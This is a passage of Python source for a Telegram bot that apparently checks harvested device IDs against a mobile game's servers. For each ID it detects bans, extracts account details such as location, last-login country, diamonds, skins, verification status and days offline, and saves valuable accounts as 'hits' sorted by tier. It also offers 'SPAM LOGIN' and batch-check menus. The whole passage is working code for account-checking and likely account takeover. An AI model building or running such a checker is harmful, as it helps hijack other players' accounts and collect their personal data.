                if got_20001:
                    continue
                continue
            if pid is None:
                if got_20001:
                    continue
                return "UNKNOWN", f"{device_id} | CLOSED_NO_20001", False
            if pid == 20001:
                got_20001 = True
                ban_info = _parse_ban_20001(res)
                if ban_info:
                    return "BANNED", _fmt_ban(device_id, ban_info), False
                else:
                    return "CLEAR", device_id, False
        return "UNKNOWN", f"{device_id} | NO_20001_AFTER_30S", True
    except Exception as e:
        return "UNKNOWN", f"{device_id} | EXC:{type(e).__name__}", True
    finally:
        c.close()


# ======================================================================
#  LOOKUP + EXTRACT
# ======================================================================
def _to_int_safe(x):
    try:
        if isinstance(x, bool):
            return int(x)
        if isinstance(x, (int, float)):
            return int(x)
        if isinstance(x, str):
            m = re.search(r"-?\d+", x.replace(",", ""))
            if m:
                return int(m.group(0))
        if isinstance(x, dict):
            for _k in (0, "0", 1, "1"):
                if _k in x:
                    v2 = _to_int_safe(x[_k])
                    if v2:
                        return v2
    except Exception:
        pass
    return 0


def map_collector_point(point):
    if point < 1000:
        return "No Tier"
    tiers = [(1000, 4000, "Amateur Collector"), (4000, 10000, "Junior Collector"),
             (10000, 22000, "Seasoned Collector"), (22000, 44000, "Expert Collector"),
             (44000, 84000, "Renowned Collector"), (84000, 160000, "Exalted Collector"),
             (160000, 280000, "Mega Collector"), (280000, float('inf'), "World Collector")]
    for min_p, max_p, name in tiers:
        if min_p <= point < max_p:
            if name == "World Collector":
                return name
            per_level = (max_p - min_p) / 5
            level = int((point - min_p) // per_level)
            roman = ["V", "IV", "III", "II", "I"][level]
            return f"{name} {roman}"
    return "Unknown"


def map_rank(p):
    RANK_DEFINITIONS = [
        {"min": 0, "max": 4, "rank": "Warrior III"}, {"min": 5, "max": 9, "rank": "Warrior II"},
        {"min": 10, "max": 14, "rank": "Warrior I"}, {"min": 15, "max": 19, "rank": "Elite IV"},
        {"min": 20, "max": 24, "rank": "Elite III"}, {"min": 25, "max": 29, "rank": "Elite II"},
        {"min": 30, "max": 34, "rank": "Elite I"}, {"min": 35, "max": 39, "rank": "Master IV"},
        {"min": 40, "max": 44, "rank": "Master III"}, {"min": 45, "max": 49, "rank": "Master II"},
        {"min": 50, "max": 54, "rank": "Master I"}, {"min": 55, "max": 59, "rank": "Grandmaster IV"},
        {"min": 60, "max": 64, "rank": "Grandmaster III"}, {"min": 65, "max": 69, "rank": "Grandmaster II"},
        {"min": 70, "max": 74, "rank": "Grandmaster I"}, {"min": 75, "max": 81, "rank": "Epic IV"},
        {"min": 82, "max": 88, "rank": "Epic III"}, {"min": 89, "max": 95, "rank": "Epic II"},
        {"min": 96, "max": 107, "rank": "Epic I"}, {"min": 108, "max": 114, "rank": "Legend IV"},
        {"min": 115, "max": 121, "rank": "Legend III"}, {"min": 122, "max": 128, "rank": "Legend II"},
        {"min": 129, "max": 135, "rank": "Legend I"},
        {"min": 136, "max": 160, "rank": lambda p: f"Mythic {p - 135}"},
        {"min": 161, "max": 195, "rank": lambda p: f"Mythical Honor {p - 135}"},
        {"min": 196, "max": 235, "rank": lambda p: f"Mythical Glory {p - 157}"},
        {"min": 236, "max": 999, "rank": lambda p: f"Mythical Immortal {p - 157}"},
    ]
    for entry in RANK_DEFINITIONS:
        if entry["min"] <= p <= entry["max"]:
            rank = entry["rank"]
            return rank(p) if callable(rank) else rank
    return "Unknown"


def format_timestamp(timestamp):
    try:
        utc_dt = datetime.datetime.fromtimestamp(timestamp, datetime.timezone.utc)
        pht_dt = utc_dt + datetime.timedelta(hours=8)
        pht_date_str = pht_dt.strftime("%Y-%m-%d %H:%M")
        now_pht = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=8)
        delta = pht_dt - now_pht
        total_seconds = int(delta.total_seconds())
        if total_seconds >= 0:
            days = total_seconds // 86400
            hours = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            rel_str = f"(in {days}d {hours}h {minutes}m)"
        else:
            total_seconds = abs(total_seconds)
            days = total_seconds // 86400
            hours = (total_seconds % 86400) // 3600
            minutes = (total_seconds % 3600) // 60
            rel_str = f"({days}d {hours}h {minutes}m ago)"
        return f"{pht_date_str} {rel_str} PHT"
    except Exception:
        return "Invalid timestamp"


def format_timestamp_full(timestamp):
    try:
        utc_dt = datetime.datetime.fromtimestamp(timestamp, datetime.timezone.utc)
        pht_dt = utc_dt + datetime.timedelta(hours=8)
        return pht_dt.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return "Invalid timestamp"


def extract_player_data(result, role_info=None, creation_ts=0, v2l_data=None):
    if not result:
        return None
    try:
        if isinstance(result, dict):
            arr = result.get(0)
        else:
            arr = result[0] if result else None
    except Exception:
        arr = None
    if not arr or not isinstance(arr, (list, tuple)) or len(arr) == 0:
        return None
    try:
        player_data = arr[0]
        if not isinstance(player_data, dict):
            return None
        nickname = player_data.get(2, "Unknown")
        player_id = player_data.get(0, "Unknown")
        server = player_data.get(1, "Unknown")
        level = player_data.get(3, "Unknown")
        skin = player_data.get(83, "Unknown")
        hero_count = player_data.get(4, 0)
        matches = player_data.get(17, 0)
        rating_score = player_data.get(9, 0)
        if role_info:
            hero_count = role_info.get(9, hero_count)
            matches = role_info.get(22, matches)
        location = "NOT FOUND"
        location_data = player_data.get(71, None)
        if location_data and isinstance(location_data, list) and len(location_data) >= 2:
            location = ", ".join(location_data)
        last_login = player_data.get(5, 0)
        last_login_formatted = format_timestamp(last_login)
        last_login_country = player_data.get(87, "Unknown")
        create_account_country = player_data.get(97, "Unknown")
        squad_icon = player_data.get(31, "")
        squad_name = player_data.get(30, "").replace("`", "").strip()
        squad = f"{squad_icon} {squad_name}".strip() if squad_name else "—"
        squad_id = 0
        if role_info and isinstance(role_info, dict):
            squad_id = role_info.get(34, 0)
        if not squad_id:
            squad_id = player_data.get(34, player_data.get(28, 0))
        squad_id_display = f"Squad ID: {squad_id}" if squad_id else "N/A"
        tag_95 = player_data.get(95)
        tag_8 = player_data.get(8)
        high_rank = map_rank(tag_95) if tag_95 is not None else "Unknown"
        current_rank = map_rank(tag_8) if tag_8 is not None else "Unknown"
        achievement_points = player_data.get(7, 0)
        tag_136 = player_data.get(136, {})
        collector_point = tag_136.get(9, 0) if isinstance(tag_136, dict) else 0
        collector_rank = tag_136.get(10, 0) if isinstance(tag_136, dict) else 0
        collector_tier = map_collector_point(collector_point)
        tag_91 = player_data.get(91, [])
        hero_history = [HERO_ID_MAP.get(hid, f"Unknown({hid})") for hid in reversed(tag_91)] if tag_91 else ["Private / Not Available"]
        v2l_status = "N/A"
        if v2l_data and isinstance(v2l_data, dict):
            source = v2l_data.get("_source", 0)
            data = v2l_data.get("_data", {})
            tags_to_check = (10, 11) if source == 10208 else (0, 2, 3, 5)
            for _tag in tags_to_check:
                _v = data.get(_tag)
                if _v is not None:
                    try:
                        val = int(_v)
                        v2l_status = "Enabled" if val > 0 else "Disabled"
                        break
                    except (ValueError, TypeError):
                        pass
        followers = 0
        if role_info and isinstance(role_info, dict):
            followers = role_info.get(23, 0)
        if not followers:
            followers = player_data.get(15, 0)
        popularity = player_data.get(14, 0)
        bio = player_data.get(24, "").strip() if isinstance(player_data.get(24), str) else ""
        likes = 0
        if role_info and isinstance(role_info, dict):
            likes = role_info.get(24, 0)
        if not likes:
            likes = player_data.get(61, 0)
        credits_score = "N/A"
        _cs_val = 0
        if role_info and isinstance(role_info, dict):
            _cs_val = role_info.get(20, 0)
        if _cs_val and isinstance(_cs_val, int) and _cs_val > 0:
            credits_score = f"{_cs_val}/110"
        else:
            _cs_fb = player_data.get(80, 0)
            if _cs_fb and isinstance(_cs_fb, int) and _cs_fb > 0:
                credits_score = f"{_cs_fb}/110"
        restriction_flags = "None"
        _t117 = None
        if role_info and isinstance(role_info, dict):
            _t117 = role_info.get(117)
        if _t117 is None:
            _t117 = player_data.get(117)
        if _t117 is not None:
            if isinstance(_t117, dict):
                _raw = _t117.get(0, 0)
            else:
                try:
                    _raw = int(_t117)
                except Exception:
                    _raw = 0
            _flag_count = int(_raw) + 1
            _pct = round((_flag_count / 7) * 100, 1)
            if _pct < 30:
                _risk, _risk_icon = "Low Risk", "OK"
            elif _pct < 60:
                _risk, _risk_icon = "Medium Risk", "WARN"
            else:
                _risk, _risk_icon = "High Risk", "HIGH"
            restriction_flags = f"{_pct}% {_risk_icon} ({_risk})"
        _t135 = player_data.get(135, {})
        _aff_level = _t135.get(1, 0) if isinstance(_t135, dict) else 0
        _AFFINITY_MAP = {0: "None", 1: "Bronze", 2: "Silver", 3: "Gold", 4: "Platinum", 5: "Diamond"}
        _aff_tier = _AFFINITY_MAP.get(_aff_level, f"Level {_aff_level}") if _aff_level else "None"
        _aff_names = []
        if role_info and isinstance(role_info, dict):
            _tag82 = role_info.get(82, [])
            if isinstance(_tag82, list):
                for _entry in _tag82:
                    if isinstance(_entry, dict):
                        _aff_name = _entry.get(2, "")
                        if _aff_name and isinstance(_aff_name, str):
                            _aff_names.append(_aff_name)
        affinity_label = ', '.join(_aff_names) if _aff_names else _aff_tier
        _skin_ts = player_data.get(176, 0)
        latest_skin_date = format_timestamp(_skin_ts) if _skin_ts else "N/A"
        _latest_skin_id = player_data.get(175, 0)
        latest_skin_id_str = str(_latest_skin_id) if _latest_skin_id else "N/A"
        _SL_TAGS = [21, 47, 50]
        _sl_expiry = 0
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            if role_info and isinstance(role_info, dict):
                _v = role_info.get(_sl_t, 0) or 0
                if isinstance(_v, int) and _v > 1700000000:
                    _sl_expiry = _v
        for _sl_t in _SL_TAGS:
            if _sl_expiry:
                break
            _v = player_data.get(_sl_t, 0) or 0
            if isinstance(_v, int) and _v > 1700000000:
                _sl_expiry = _v
        if _sl_expiry:
            starlight_user = "Yes" if _sl_expiry > time.time() else "No"
            starlight_expiry = format_timestamp(_sl_expiry)
        else:
            starlight_user = "No"
            starlight_expiry = "N/A"
        starlight_months = player_data.get(60, 0)
        tickets = 0
        if role_info and isinstance(role_info, dict):
            tickets = role_info.get(49, 0)
        if not tickets:
            tickets = player_data.get(49, 0)
        total_wins = player_data.get(18, 0)
        _MIN_VALID_TS = 1451577600
        _create_ts_fallback = player_data.get(6, 0)
        if creation_ts and creation_ts >= _MIN_VALID_TS:
            creation_date = format_timestamp_full(creation_ts)
        elif _create_ts_fallback and _create_ts_fallback >= _MIN_VALID_TS:
            creation_date = format_timestamp_full(_create_ts_fallback)
        else:
            creation_date = "N/A"
        mcl_wins = 0
        if role_info and isinstance(role_info, dict):
            mcl_wins = role_info.get(46, 0)
        if not mcl_wins:
            mcl_wins = player_data.get(104, player_data.get(103, 0))
        win_count = 0
        if role_info and isinstance(role_info, dict):
            win_count = role_info.get(22, 0)
        total_battles = 0
        if role_info and isinstance(role_info, dict):
            total_battles = role_info.get(77, 0)
        if not total_battles:
            total_battles = player_data.get(17, 0)
        _wins_for_rate = win_count if win_count else total_wins
        if total_battles > 0 and _wins_for_rate > 0:
            _wr_val = (_wins_for_rate / total_battles) * 100
            win_rate = f"{min(_wr_val, 100):.1f}% (approx)" if _wr_val > 100 else f"{_wr_val:.1f}%"
        else:
            win_rate = "N/A"
        diamonds = 0
        bp = 0
        if role_info and isinstance(role_info, dict):
            _cr = role_info.get(111, role_info.get("111", None))
            if isinstance(_cr, dict):
                _d = _to_int_safe(_cr.get(0, _cr.get("0", 0)))
                _b = _to_int_safe(_cr.get(1, _cr.get("1", 0)))
                if _d:
                    diamonds = _d
                if _b:
                    bp = _b
            else:
                _d = _to_int_safe(_cr)
                if _d:
                    diamonds = _d
        if not diamonds:
            _pd111 = player_data.get(111, player_data.get("111", None))
            if isinstance(_pd111, dict):
                _d = _to_int_safe(_pd111.get(0, _pd111.get("0", 0)))
                _b = _to_int_safe(_pd111.get(1, _pd111.get("1", 0)))
                if _d:
                    diamonds = _d
                if _b and not bp:
                    bp = _b
            else:
                _d = _to_int_safe(_pd111)
                if _d:
                    diamonds = _d
        if not diamonds:
            for _cand_tag in (129, 86, 130, 85, 108, 112, 116, 120):
                _cand = player_data.get(_cand_tag, player_data.get(str(_cand_tag), None))
                _d = _to_int_safe(_cand)
                if _d and _d < 100_000_000:
                    diamonds = _d
                    break
        if not diamonds and role_info and isinstance(role_info, dict):
            for _cand_tag in (129, 86, 130, 108, 112):
                _cand = role_info.get(_cand_tag, role_info.get(str(_cand_tag), None))
                _d = _to_int_safe(_cand)
                if _d and _d < 100_000_000:
                    diamonds = _d
                    break
        if not bp:
            bp = _to_int_safe(player_data.get(83, player_data.get("83", 0)) or 0)
        last_diamond_purchase = "N/A"
        _diamond_buy_ts = player_data.get(42, 0)
        if _diamond_buy_ts and isinstance(_diamond_buy_ts, int) and _diamond_buy_ts > 1000000000:
            last_diamond_purchase = format_timestamp(_diamond_buy_ts)
        starlight_count = 0
        if role_info and isinstance(role_info, dict):
            starlight_count = role_info.get(60, 0)
        skin_counts = {"Supreme Skins": 0, "Grand Skins": 0, "Exquisite Skins": 0,
                       "Deluxe Skins": 0, "Exceptional Skins": 0, "Common Skins": 0}
        _tag118 = None
        if role_info and isinstance(role_info, dict):
            _tag118 = role_info.get(118)
        if not _tag118:
            _tag118 = player_data.get(118)
        if _tag118:
            if isinstance(_tag118, dict):
                skin_data = _tag118.get(4, _tag118.get('4', {}))
                if isinstance(skin_data, dict):
                    skin_types = {6: "Supreme Skins", 5: "Grand Skins", 4: "Exquisite Skins",
                                  3: "Deluxe Skins", 2: "Exceptional Skins", 1: "Common Skins"}
                    for skin_id, count in skin_data.items():
                        if skin_id in skin_types:
                            skin_counts[skin_types[skin_id]] = count
        return {
            'nickname': nickname, 'player_id': player_id, 'server': server, 'level': level,
            'skin_count': skin, 'hero_count': hero_count, 'matches': matches,
            'rating_score': rating_score,
            'location': location, 'last_login': last_login_formatted, 'last_login_ts': last_login,
            'last_login_country': last_login_country, 'create_account_country': create_account_country,
            'high_rank': high_rank, 'current_rank': current_rank,
            'achievement_points': achievement_points,
            'collector_point': collector_point, 'collector_rank': collector_rank,
            'collector_tier': collector_tier,
            'hero_history': hero_history, 'squad': squad, 'squad_id': squad_id_display,
            'skin_breakdown': skin_counts, 'affinity': affinity_label, 'likes': likes,
            'credits_score': credits_score if credits_score and credits_score != "N/A" else None,
            'followers': followers, 'popularity': popularity, 'bio': bio if bio else None,
            'latest_skin_date': latest_skin_date, 'starlight_user': starlight_user,
            'starlight_expiry': starlight_expiry,
            'starlight_months': starlight_months if starlight_months else None,
            'tickets': tickets if tickets else None,
            'total_wins': total_wins if total_wins else None,
            'restriction_flags': restriction_flags,
            'mcl_champion_wins': mcl_wins, 'v2l_status': v2l_status,
            'creation_date': creation_date,
            'win_count': win_count, 'total_battles': total_battles,
            'win_rate': win_rate, 'battle_points': bp if bp else None, 'diamonds': diamonds,
            'last_diamond_purchase': last_diamond_purchase if last_diamond_purchase != "N/A" else None,
            'starlight_count': starlight_count if starlight_count else None,
            'latest_skin_id': latest_skin_id_str if latest_skin_id_str != "N/A" else None,
        }
    except Exception:
        return None


def lookup_player_data(device_id, role_id, zone_id):
    try:
        with GameConnection(device_id=device_id) as conn:
            if not conn.connect_to_game_server():
                return {"status": "error", "error": "Failed to connect to game server"}
            result = conn.lookup_player(role_id, "id", zone_id=zone_id)
            if not result:
                return {"status": "error", "error": "Lookup returned None"}
            role_info_data = None
            try:
                skin_role_info = conn.get_skin_role_info(role_id, zone_id)
                if skin_role_info and isinstance(skin_role_info, dict):
                    role_info_data = {}
                    for _k, _v in skin_role_info.items():
                        role_info_data[_k] = _v
            except Exception:
                pass
            _v2l_data = None
            try:
                _v2l_data = conn.get_v2l_status(role_id, zone_id)
            except Exception:
                pass
            player_data = extract_player_data(result, role_info=role_info_data,
                                              creation_ts=conn.creation_ts,
                                              v2l_data=_v2l_data)
            if player_data:
                return {"status": "success", "player_data": player_data}
            return {"status": "error", "error": "Error extracting player data"}
    except Exception as e:
        return {"status": "error", "error": f"{type(e).__name__}: {e}"}


# ======================================================================
#  CLEAN DEVICE IDS
# ======================================================================
DEVICE_ID_PATTERN_LOOSE = re.compile(r"\b((?:and_|ios_)[A-Za-z0-9_\-]+)", re.IGNORECASE)

LINE_PATTERN_FULL = re.compile(
    r"Device\s*id\s*[:\-]\s*((?:and_|ios_)[^\s|]+)"
    r"(?:\s*\|\s*account\s*id\s*[:\-]\s*(\d+))?"
    r"(?:\s*\|\s*zone\s*id\s*[:\-]\s*(\d+))?",
    re.IGNORECASE
)


def clean_device_ids_from_text(text, keep_only_ids=False):
    stats = {"raw_lines": 0, "found_full": 0, "found_id_only": 0, "unique": 0, "duplicates": 0}
    results = []
    seen = set()

    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        stats["raw_lines"] += 1
        m = LINE_PATTERN_FULL.search(line)
        if m:
            device = m.group(1).strip()
            role_id = int(m.group(2)) if m.group(2) else None
            zone_id = int(m.group(3)) if m.group(3) else None
            if device in seen:
                stats["duplicates"] += 1
                continue
            seen.add(device)
            if role_id and zone_id:
                stats["found_full"] += 1
            else:
                stats["found_id_only"] += 1
            if keep_only_ids:
                results.append(device)
            else:
                results.append({"device": device, "role_id": role_id, "zone_id": zone_id})
            continue
        m2 = DEVICE_ID_PATTERN_LOOSE.search(line)
        if m2:
            device = m2.group(1).strip()
            if device in seen:
                stats["duplicates"] += 1
                continue
            seen.add(device)
            stats["found_id_only"] += 1
            if keep_only_ids:
                results.append(device)
            else:
                results.append({"device": device, "role_id": None, "zone_id": None})
    stats["unique"] = len(results)
    return results, stats


def build_cleaned_txt(cleaned_list):
    lines = []
    lines.append("=" * 60)
    lines.append(f"{BOT_NAME} BOT - Cleaned Device IDs")
    lines.append(f"DEVELOPER - {DEVELOPER}")
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"Total unique: {len(cleaned_list)}")
    lines.append("=" * 60)
    lines.append("")
    for item in cleaned_list:
        dev = item["device"]
        rid = item.get("role_id")
        zid = item.get("zone_id")
        if rid and zid:
            lines.append(f"Device id: {dev} | account id: {rid} | zone id: {zid}")
        else:
            lines.append(f"Device id: {dev}")
    return "\n".join(lines) + "\n"


def build_hit_txt(device_id, role_id, zone_id, pd):
    days = _offline_days(pd.get("last_login_ts", 0))
    days_str = f"{days} day(s)" if days is not None else "N/A"
    lines = [
        "=" * 60,
        f"Device ID: {device_id}",
        f"Account ID: {role_id}",
        f"Zone ID: {zone_id}",
        "=" * 60,
        f"Name: {pd.get('nickname', 'N/A')}",
        f"Level: {pd.get('level', 'N/A')}",
        f"Current Rank: {pd.get('current_rank', 'N/A')}",
        f"Max Rank: {pd.get('high_rank', 'N/A')}",
        f"Hero Count: {pd.get('hero_count', 0)}",
        f"Skin Count: {pd.get('skin_count', 0)}",
        f"  - Supreme: {pd.get('skin_breakdown', {}).get('Supreme Skins', 0)}",
        f"  - Grand: {pd.get('skin_breakdown', {}).get('Grand Skins', 0)}",
        f"  - Exquisite: {pd.get('skin_breakdown', {}).get('Exquisite Skins', 0)}",
        f"  - Deluxe: {pd.get('skin_breakdown', {}).get('Deluxe Skins', 0)}",
        f"  - Exceptional: {pd.get('skin_breakdown', {}).get('Exceptional Skins', 0)}",
        f"  - Common: {pd.get('skin_breakdown', {}).get('Common Skins', 0)}",
        f"Collector Point: {pd.get('collector_point', 0)}",
        f"Collector Tier: {pd.get('collector_tier', 'N/A')}",
        f"Diamonds: {pd.get('diamonds', 0)}",
        f"V2L Status: {pd.get('v2l_status', 'N/A')}",
        f"Last Login: {pd.get('last_login', 'N/A')}",
        f"Offline Days: {days_str}",
        f"Creation Date: {pd.get('creation_date', 'N/A')}",
        "=" * 60,
    ]
    return "\n".join(lines)


# ======================================================================
#  DATABASE (VPS-READY)
# ======================================================================
_db_lock = threading.Lock()


def db_init():
    with sqlite3.connect(DB_PATH) as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY, username TEXT,
            first_seen INTEGER, last_seen INTEGER, is_banned INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, device_id TEXT, account_id INTEGER, zone_id INTEGER,
            nickname TEXT, level INTEGER, skin_count INTEGER,
            collector_tier TEXT, collector_base TEXT, collector_roman TEXT,
            current_rank TEXT, high_rank TEXT, diamonds INTEGER, v2l_status TEXT,
            last_login_ts INTEGER DEFAULT 0,
            created_at INTEGER, source TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_hits_user ON hits(user_id);
        CREATE TABLE IF NOT EXISTS checks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER, check_type TEXT, total INTEGER, valid INTEGER,
            banned INTEGER, errors INTEGER, created_at INTEGER, summary_txt TEXT
        );
        """)
        try:
            c.execute("ALTER TABLE hits ADD COLUMN last_login_ts INTEGER DEFAULT 0")
        except Exception:
            pass


def db_ensure_user(user_id, username=""):
    now = int(time.time())
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("INSERT OR IGNORE INTO users(user_id, username, first_seen, last_seen) VALUES (?,?,?,?)",
                  (user_id, username or "", now, now))
        c.execute("UPDATE users SET last_seen=?, username=? WHERE user_id=?",
                  (now, username or "", user_id))


def db_is_banned(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        row = c.execute("SELECT is_banned FROM users WHERE user_id=?", (user_id,)).fetchone()
    return bool(row and row[0])


def db_insert_hit(user_id, pd, device_id, account_id, zone_id, source):
    base, roman, full = _normalize_collector_tier(pd.get("collector_tier", ""))
    now = int(time.time())
    last_login_ts = int(pd.get("last_login_ts", 0) or 0)
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""INSERT INTO hits(user_id, device_id, account_id, zone_id, nickname, level,
            skin_count, collector_tier, collector_base, collector_roman, current_rank, high_rank,
            diamonds, v2l_status, last_login_ts, created_at, source)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""", (
            user_id, str(device_id)[:200], int(account_id) if account_id else 0,
            int(zone_id) if zone_id else 0, str(pd.get("nickname", ""))[:100],
            int(pd.get("level", 0) or 0), int(pd.get("skin_count", 0) or 0),
            full[:80], base[:80], roman[:8],
            str(pd.get("current_rank", ""))[:60], str(pd.get("high_rank", ""))[:60],
            int(pd.get("diamonds", 0) or 0), str(pd.get("v2l_status", "N/A"))[:20],
            last_login_ts, now, source,
        ))


def db_insert_check(user_id, check_type, total, valid, banned, errors, summary=""):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("""INSERT INTO checks(user_id, check_type, total, valid, banned, errors,
                     created_at, summary_txt) VALUES (?,?,?,?,?,?,?,?)""",
                  (user_id, check_type, total, valid, banned, errors, int(time.time()), summary[:3000]))


def db_user_hits(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        return c.execute("""SELECT id, device_id, account_id, zone_id, nickname, level, skin_count,
            collector_tier, collector_base, collector_roman, current_rank, high_rank, diamonds,
            v2l_status, created_at, source, last_login_ts
            FROM hits WHERE user_id=? ORDER BY id DESC""", (user_id,)).fetchall()


def db_delete_hit(hit_id, user_id=None):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        if user_id is not None:
            c.execute("DELETE FROM hits WHERE id=? AND user_id=?", (hit_id, user_id))
        else:
            c.execute("DELETE FROM hits WHERE id=?", (hit_id,))


def db_clear_user_hits(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        c.execute("DELETE FROM hits WHERE user_id=?", (user_id,))


def db_user_stats(user_id):
    with _db_lock, sqlite3.connect(DB_PATH) as c:
        tiers = c.execute("""SELECT collector_base, collector_roman, COUNT(*) FROM hits
            WHERE user_id=? GROUP BY collector_base, collector_roman""", (user_id,)).fetchall()
        ranks = c.execute("SELECT current_rank, COUNT(*) FROM hits WHERE user_id=? GROUP BY current_rank",
                          (user_id,)).fetchall()
        v2l = c.execute("SELECT v2l_status, COUNT(*) FROM hits WHERE user_id=? GROUP BY v2l_status",
                        (user_id,)).fetchall()
        total = c.execute("SELECT COUNT(*) FROM hits WHERE user_id=?", (user_id,)).fetchone()[0]
        checks = c.execute("SELECT COUNT(*) FROM checks WHERE user_id=?", (user_id,)).fetchone()[0]
        last_logins = c.execute("SELECT last_login_ts FROM hits WHERE user_id=?", (user_id,)).fetchall()
    return {
        "tiers": tiers,
        "ranks": ranks,
        "v2l": v2l,
        "total": total,
        "checks": checks,
        "last_logins": [r[0] for r in last_logins],
    }


# ======================================================================
#  TELEGRAM KEYBOARDS
# ======================================================================
def kb_main(is_admin_user=False):
    rows = [
        [KButton("4STEP CHECK", style="primary")],
        [KButton("SINGLE CHECK", style="primary")],
        [KButton("SPAM LOGIN", style="danger")],
        [KButton("FILES", style="success")],
        [KButton("STATISTICS", style="success")],
    ]
    if is_admin_user:
        rows.append([KButton("ADMIN PANEL", style="danger")])
    rows.append([KButton("HELP", style="primary"), KButton("CANCEL", style="danger")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True, one_time_keyboard=False)


def kb_back_only():
    return ReplyKeyboardMarkup([[KButton("BACK", style="danger")]],
                                resize_keyboard=True, one_time_keyboard=False)


def kb_4step():
    return ReplyKeyboardMarkup(
        [[KButton("UPLOAD FILE", style="primary")],
         [KButton("PASTE MANUAL", style="primary")],
         [KButton("BACK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_single():
    return ReplyKeyboardMarkup(
        [[KButton("TYPE DEVICE ID", style="primary")],
         [KButton("BACK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_spam():
    return ReplyKeyboardMarkup(
        [[KButton("START SPAM", style="danger")],
         [KButton("STOP SPAM", style="primary")],
         [KButton("BACK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_files():
    return ReplyKeyboardMarkup(
        [[KButton("LIST HITS", style="primary")],
         [KButton("DOWNLOAD ALL HITS", style="primary")],
         [KButton("SELECT TIER FILES", style="success")],
         [KButton("DOWNLOAD ALL TIER FILES", style="primary")],
         [KButton("DELETE HIT BY ID", style="danger")],
         [KButton("CLEAR ALL HITS", style="danger")],
         [KButton("BACK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_stats():
    return ReplyKeyboardMarkup(
        [[KButton("TIER BREAKDOWN", style="primary")],
         [KButton("RANK BREAKDOWN", style="primary")],
         [KButton("V2L BREAKDOWN", style="primary")],
         [KButton("OFFLINE BREAKDOWN", style="primary")],
         [KButton("FULL SUMMARY", style="success")],
         [KButton("BACK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_admin():
    return ReplyKeyboardMarkup(
        [[KButton("DOWNLOAD DB", style="primary")],
         [KButton("USER LIST", style="primary")],
         [KButton("BACK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_cancel():
    return ReplyKeyboardMarkup([[KButton("CANCEL", style="danger")]],
                                resize_keyboard=True, one_time_keyboard=False)


def kb_confirm_start():
    return ReplyKeyboardMarkup(
        [[KButton("CONFIRM START", style="success")],
         [KButton("CANCEL", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_confirm_clear():
    return ReplyKeyboardMarkup(
        [[KButton("CONFIRM_CLEAR", style="danger")],
         [KButton("CANCEL", style="danger")]],
        resize_keyboard=True, one_time_keyboard=True
    )


def kb_check_running():
    return ReplyKeyboardMarkup(
        [[KButton("PAUSE", style="primary")],
         [KButton("STOP CHECK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_check_paused():
    return ReplyKeyboardMarkup(
        [[KButton("RESUME", style="success")],
         [KButton("STOP CHECK", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


def kb_tier_select():
    return ReplyKeyboardMarkup(
        [[KButton("SELECT ALL", style="success")],
         [KButton("DONE", style="primary")],
         [KButton("CANCEL", style="danger")]],
        resize_keyboard=True, one_time_keyboard=False
    )


# ======================================================================
#  PROGRESS BAR ONLY (no live state text)
# ======================================================================
def render_progress_bar(done, total, size=20):
    if total <= 0:
        return "[" + "." * size + "]"
    filled = int(size * done / total)
    filled = max(0, min(size, filled))
    return "[" + "#" * filled + "." * (size - filled) + "]"


def render_progress_only(job_state):
    """Just a progress bar — no text, no counters."""
    done = job_state.get("done", 0)
    total = job_state.get("total", 0)
    if total <= 0:
        return "[....................]"
    return render_progress_bar(done, total)


# ======================================================================
#  BOT HANDLERS
# ======================================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        await update.message.reply_text("You are banned.", reply_markup=ReplyKeyboardRemove())
        return
    ctx.user_data["menu"] = "main"
    await update.message.reply_text(
        f"{BOT_NAME} BOT\n"
        f"DEVELOPER - {DEVELOPER}\n\n"
        "Choose an option below:",
        reply_markup=kb_main(uid in ADMIN_IDS)
    )


async def cmd_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    ctx.user_data["menu"] = "main"
    await update.message.reply_text("Main menu:", reply_markup=kb_main(uid in ADMIN_IDS))


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    db_ensure_user(uid, update.effective_user.username or "")
    if db_is_banned(uid):
        await update.message.reply_text("You are banned.", reply_markup=ReplyKeyboardRemove())
        return

    text = (update.message.text or "").strip()
    menu = ctx.user_data.get("menu", "main")

    if text == "PAUSE":
        jid = ctx.user_data.get("active_job")
        if not jid:
            await update.message.reply_text("No active check.",
                                            reply_markup=kb_main(uid in ADMIN_IDS))
            return
        job_set_state(jid, "paused")
